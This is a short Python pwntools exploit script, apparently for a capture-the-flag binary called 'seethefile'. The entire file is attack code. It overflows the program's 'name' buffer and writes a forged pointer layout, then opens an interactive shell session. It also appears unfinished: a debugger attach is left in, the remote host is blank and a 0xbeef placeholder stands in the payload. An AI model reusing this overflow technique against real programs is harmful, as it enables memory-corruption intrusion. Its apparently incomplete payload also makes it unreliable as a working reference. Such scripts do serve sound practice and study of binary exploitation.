from pwn import *

e = ELF("./seethefile")
libc = ELF("./libc_32.so.6")

if "--remote" in sys.argv:
  p = remote("", 0)
else:
  p = process(["./ld-linux-32.so", e.path], env={"LD_PRELOAD": libc.path})

p.sendlineafter(":", "1")
p.sendlineafter(":", "a.txt")
gdb.attach(p)
p.sendlineafter(":", "5")

print("{:#x}".format(e.symbols["name"]))

offset = e.symbols["name"] + 0x24
p.sendlineafter(":", "A" * 4 + p32(offset) + "A" * 0x18 + p32(e.symbols["name"] - 0x150) + "AAAA" * 28 + p32(0xbeef) + p32(0) * 3)


p.interactive()
